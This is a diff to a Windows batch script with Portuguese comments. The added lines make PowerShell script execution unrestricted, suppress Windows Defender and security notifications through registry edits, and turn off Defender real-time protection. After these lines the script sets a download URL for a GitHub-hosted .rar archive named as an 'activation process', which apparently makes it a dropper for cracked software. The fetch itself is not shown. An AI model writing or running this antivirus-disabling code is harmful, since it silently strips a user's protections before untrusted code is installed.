@@ -1,6 +1,21 @@
 @echo off
 
+# Define a política de execução do PowerShell para permitir a execução de scripts
 powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force"
+
+# Modifica as entradas de registro para desativar as notificações
+powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableNotifications' -Value 1 -Type DWord -Force"
+powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableEnhancedNotifications' -Value 1 -Type DWord -Force"
+powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance' -Name 'Enabled' -Value 0 -Type DWord -Force"
+
+# Aguarda 10 segundos
+powershell -Command "Start-Sleep -Seconds 10"
+
+# Desativa a proteção em tempo real
+powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force"
+powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force"
+
+# Desativa a proteção em tempo real usando Set-MpPreference
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 set urlProgram=https://github.com/diegrp/atv-dbooster/raw/main/processo-ativacao.rar
